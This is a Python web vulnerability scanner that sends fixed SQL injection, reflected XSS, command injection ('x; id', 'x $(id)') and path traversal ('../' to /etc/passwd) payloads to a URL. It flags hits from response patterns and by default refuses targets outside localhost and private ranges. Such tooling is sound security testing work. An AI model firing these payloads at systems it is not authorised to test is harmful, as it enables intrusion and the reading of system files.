"""
Minimal, LLM-free, rule-based vulnerability auto-scanner.

Strix (AI-agent pentesting) uses an LLM to decide what to try next, and
can look for many vulnerability classes (SQLi, XSS, SSRF, auth bugs, ...).
This script replaces that decision-making with a fixed payload list PER
vulnerability class, and deterministic response checks -- no LLM, no
agent loop, no Docker. Adding a new class means adding a new entry to
VULN_CLASSES below: a payload list + a detect() function.

Scope: run only against targets you own/control, e.g. vulnerable_app.py
in this same directory.
"""

from __future__ import annotations

import argparse
import ipaddress
import socket
import sys
from dataclasses import dataclass, field
from typing import Callable
from urllib.parse import urlparse

import requests

# Same allow-list as netcheck/netcheck.py: loopback + RFC1918 private ranges.
# This scanner actually fires live attack payloads, so by default it refuses
# to touch anything that isn't a target you plausibly run yourself.
ALLOWED_NETWORKS = [
    ipaddress.ip_network(net)
    for net in ("127.0.0.0/8", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "::1/128")
]


def _is_allowed_target(url: str) -> tuple[bool, str]:
    host = urlparse(url).hostname
    if not host:
        return False, f"could not parse a hostname out of {url!r}"

    try:
        infos = socket.getaddrinfo(host, None)
    except socket.gaierror as exc:
        return False, f"could not resolve host {host!r}: {exc}"

    addrs = {info[4][0] for info in infos}
    for addr in addrs:
        ip = ipaddress.ip_address(addr)
        if not any(ip in net for net in ALLOWED_NETWORKS):
            return False, (
                f"{host!r} resolves to {addr}, which is outside localhost/RFC1918 "
                f"private ranges. This scanner only fires live attack payloads at "
                f"targets you own; pass --i-own-this-target to override."
            )
    return True, ""

# --------------------------------------------------------------------------
# SQLi
# --------------------------------------------------------------------------

SQL_ERROR_MARKERS = (
    "sql error",
    "sqlite3.operationalerror",
    "you have an error in your sql syntax",
    "unclosed quotation mark",
    "odbc sql server driver",
)

SQLI_PAYLOADS = [
    "' --",
    "' OR '1'='1' --",
    '" OR "1"="1" --',
    "' OR 1=1 --",
    "') OR ('1'='1' --",
    "' UNION SELECT NULL,NULL,NULL --",
    "'",
    '"',
]


def detect_sqli(resp: requests.Response, baseline: requests.Response, payload: str) -> str | None:
    text = resp.text.lower()
    if any(marker in text for marker in SQL_ERROR_MARKERS):
        return "error-based: SQL error leaked in response"

    baseline_looked_like_success = "login ok" in baseline.text.lower()
    if not baseline_looked_like_success and "login ok" in text:
        return "boolean/auth-bypass: baseline failed, payload succeeded"

    if resp.status_code != baseline.status_code:
        return f"status code changed ({baseline.status_code} -> {resp.status_code})"

    return None


# --------------------------------------------------------------------------
# Reflected XSS: payload reflected verbatim (unescaped) in the HTML body
# --------------------------------------------------------------------------

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    '"><img src=x onerror=alert(1)>',
    "'><svg onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
]


def detect_xss(resp: requests.Response, baseline: requests.Response, payload: str) -> str | None:
    # If the exact payload (with its angle brackets/quotes intact) shows up
    # verbatim in the body, the app reflected it without HTML-escaping.
    if payload in resp.text:
        return "reflected: payload echoed back unescaped in HTML body"
    return None


# --------------------------------------------------------------------------
# OS command injection: a marker command's distinctive output leaks into
# the response when shell metacharacters are not neutralized.
# --------------------------------------------------------------------------

CMDI_PAYLOADS = [
    "x; id",
    "x && id",
    "x | id",
    "x `id`",
    "x $(id)",
]


def detect_cmdi(resp: requests.Response, baseline: requests.Response, payload: str) -> str | None:
    if "uid=" in resp.text and "uid=" not in baseline.text:
        return "command injection: 'id' output leaked into response"
    return None


# --------------------------------------------------------------------------
# Path traversal: ../ sequences escape the intended directory and reach
# an unrelated file (/etc/passwd here, as a readable marker file).
# --------------------------------------------------------------------------

TRAVERSAL_PAYLOADS = [
    "../" * 10 + "etc/passwd",
    "..%2f" * 10 + "etc/passwd",
    "....//" * 10 + "etc/passwd",
]


def detect_traversal(resp: requests.Response, baseline: requests.Response, payload: str) -> str | None:
    if "root:x:0:0" in resp.text:
        return "path traversal: read /etc/passwd outside the intended directory"
    return None


# --------------------------------------------------------------------------
# Registry: add a new vulnerability class here
# --------------------------------------------------------------------------


@dataclass
class VulnClass:
    payloads: list[str]
    detect: Callable[[requests.Response, requests.Response, str], str | None]


VULN_CLASSES: dict[str, VulnClass] = {
    "sqli": VulnClass(SQLI_PAYLOADS, detect_sqli),
    "xss": VulnClass(XSS_PAYLOADS, detect_xss),
    "cmdi": VulnClass(CMDI_PAYLOADS, detect_cmdi),
    "traversal": VulnClass(TRAVERSAL_PAYLOADS, detect_traversal),
}


@dataclass
class Finding:
    param: str
    payload: str
    reason: str
    response_snippet: str = field(repr=False)


def probe(
    url: str, base_params: dict[str, str], param: str, payload: str
) -> requests.Response:
    params = dict(base_params)
    params[param] = payload
    return requests.get(url, params=params, timeout=10)


def scan(
    url: str, base_params: dict[str, str], fuzz_params: list[str], vuln_class: VulnClass
) -> list[Finding]:
    baseline = requests.get(url, params=base_params, timeout=10)

    findings: list[Finding] = []
    for param in fuzz_params:
        for payload in vuln_class.payloads:
            resp = probe(url, base_params, param, payload)
            reason = vuln_class.detect(resp, baseline, payload)
            if reason:
                findings.append(Finding(param, payload, reason, resp.text))

    return findings


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", required=True, help="e.g. http://127.0.0.1:5000/search")
    parser.add_argument(
        "--class",
        dest="vuln_class_name",
        required=True,
        choices=sorted(VULN_CLASSES),
        help="vulnerability class to test for",
    )
    parser.add_argument(
        "--baseline",
        action="append",
        default=[],
        metavar="KEY=VALUE",
        help="known-benign baseline param, repeatable, e.g. --baseline q=zzz",
    )
    parser.add_argument(
        "--fuzz",
        action="append",
        required=True,
        help="param name to fuzz, repeatable, e.g. --fuzz q",
    )
    parser.add_argument(
        "--i-own-this-target",
        action="store_true",
        help="override the localhost/RFC1918-only scope check; only use this "
        "against a target you actually own or are explicitly authorized to test",
    )
    args = parser.parse_args()

    if not args.i_own_this_target:
        allowed, reason = _is_allowed_target(args.url)
        if not allowed:
            print(f"Refusing to scan: {reason}", file=sys.stderr)
            return 2

    base_params = dict(kv.split("=", 1) for kv in args.baseline)
    vuln_class = VULN_CLASSES[args.vuln_class_name]

    print(f"Target: {args.url}")
    print(f"Vulnerability class: {args.vuln_class_name}")
    print(f"Baseline params: {base_params}")
    print(f"Fuzzing params: {args.fuzz}")
    print(f"Payload count: {len(vuln_class.payloads)}")
    print("-" * 60)

    findings = scan(args.url, base_params, args.fuzz, vuln_class)

    if not findings:
        print("No indicators found with this payload set.")
        return 0

    print(f"{len(findings)} finding(s):\n")
    for f in findings:
        print(f"  param={f.param!r} payload={f.payload!r}")
        print(f"    reason: {f.reason}")
        print()

    return 1


if __name__ == "__main__":
    sys.exit(main())
